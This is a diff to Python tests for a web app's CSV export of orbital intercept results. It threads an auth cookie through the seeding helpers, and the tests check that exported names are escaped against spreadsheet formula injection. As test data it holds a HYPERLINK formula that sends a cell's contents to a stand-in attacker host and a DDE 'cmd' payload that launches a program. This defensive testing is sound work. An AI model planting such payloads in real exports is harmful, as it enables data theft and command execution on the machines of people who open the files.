@@ -10,6 +10,8 @@ from __future__ import annotations
 import csv
 import io
 
+from tests.integration.conftest import session_state
+
 # Every delta-v column carries its unit in the name. A header reading km/s over
 # a value in m/s is worse than either unit alone, because whoever opens the file
 # cannot tell which one they have.
@@ -127,14 +129,13 @@ class TestExportIsNotAFormulaCarrier:
     """
 
     @staticmethod
-    def _seed(name: str, notes: str = "") -> str:
+    def _seed(cookie: str, name: str, notes: str = "") -> str:
         """Put one result carrying *name* into the test operator's history."""
         from datetime import UTC, datetime
 
         from spectre.domain.models import BurnResult, InterceptMethod, InterceptResult
-        from spectre.web.planning_state import get_session_state
 
-        state = get_session_state("testadmin")
+        state = session_state(cookie)
         epoch = datetime(2026, 1, 1, tzinfo=UTC)
         state.intercept_history.append(
             InterceptResult(
@@ -162,16 +163,15 @@ class TestExportIsNotAFormulaCarrier:
         return "INT_FORMULATEST"
 
     @staticmethod
-    def _clear() -> None:
-        from spectre.web.planning_state import get_session_state
+    def _clear(cookie: str) -> None:
 
-        get_session_state("testadmin").intercept_history.clear()
+        session_state(cookie).intercept_history.clear()
 
     def test_a_formula_shaped_name_is_written_as_text(
         self, client: object, auth_cookie: str
     ) -> None:
         payload = '=HYPERLINK("http://attacker.example/"&A1,"open me")'
-        run_id = self._seed(payload)
+        run_id = self._seed(auth_cookie, payload)
         try:
             resp = client.get(  # type: ignore[attr-defined]
                 "/plan/export",
@@ -185,13 +185,13 @@ class TestExportIsNotAFormulaCarrier:
             assert not red.startswith("="), "the name is still a live formula"
             assert red == "'" + payload, "the name must survive intact, quoted"
         finally:
-            self._clear()
+            self._clear(auth_cookie)
 
     def test_every_formula_lead_is_covered(self, client: object, auth_cookie: str) -> None:
         """``+``, ``-`` and ``@`` are formula leads too, not just ``=``."""
         for lead in ("+", "-", "@"):
             payload = f"{lead}cmd|' /C calc'!A0"
-            run_id = self._seed(payload)
+            run_id = self._seed(auth_cookie, payload)
             try:
                 resp = client.get(  # type: ignore[attr-defined]
                     "/plan/export",
@@ -203,7 +203,7 @@ class TestExportIsNotAFormulaCarrier:
                 red = rows[0][_EXPECTED_COLUMNS.index("red_name")]
                 assert red.startswith("'"), f"a leading {lead} was left live"
             finally:
-                self._clear()
+                self._clear(auth_cookie)
 
     def test_a_negative_delta_v_is_left_alone(self, client: object, auth_cookie: str) -> None:
         """The escape must not quote the numeric columns.
@@ -213,7 +213,7 @@ class TestExportIsNotAFormulaCarrier:
         break the 'importable into pandas without reshaping' contract, so the
         numeric exemption is load-bearing and this holds it there.
         """
-        run_id = self._seed("RED-1")
+        run_id = self._seed(auth_cookie, "RED-1")
         try:
             resp = client.get(  # type: ignore[attr-defined]
                 "/plan/export",
@@ -225,7 +225,7 @@ class TestExportIsNotAFormulaCarrier:
             prograde = rows[0][_EXPECTED_COLUMNS.index("dv_prograde_m_s")]
             assert prograde == "-4.250", f"a negative delta-v was mangled: {prograde!r}"
         finally:
-            self._clear()
+            self._clear(auth_cookie)
 
 
 class TestNoRowBypassesTheEscape:
@@ -362,10 +362,9 @@ class TestRunIdCannotReachTheResponseHeader:
         from datetime import UTC, datetime
 
         from spectre.domain.models import InterceptMethod, InterceptResult
-        from spectre.web.planning_state import get_session_state
 
         run_id = "INT_9F3C1A77B2"
-        state = get_session_state("testadmin")
+        state = session_state(auth_cookie)
         epoch = datetime(2026, 1, 1, tzinfo=UTC)
         state.intercept_history.append(
             InterceptResult(
